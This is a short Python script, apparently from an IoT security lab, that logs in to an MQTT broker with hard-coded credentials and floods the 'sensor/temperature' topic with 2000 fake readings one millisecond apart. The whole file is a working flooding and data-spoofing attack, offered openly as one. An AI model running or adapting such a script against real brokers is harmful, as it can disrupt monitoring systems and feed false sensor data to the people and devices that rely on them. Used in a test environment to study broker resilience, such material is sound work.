import time
import paho.mqtt.client as mqtt

BROKER = 'broker'
PORT = 1883
TOPIC = 'sensor/temperature'

client = mqtt.Client(client_id='flooder')
client.username_pw_set('sensor', 'password')  # Using valid creds
client.connect(BROKER, PORT, 60)
client.loop_start()

for i in range(2000):  # send 2000 fast messages
	payload = f"FAKE_TEMP {i}"
	client.publish(TOPIC, payload)
	print(f"[FLOOD] Sent {payload}")
	time.sleep(0.001)  # 1 ms between messages

client.loop_stop()
client.disconnect()
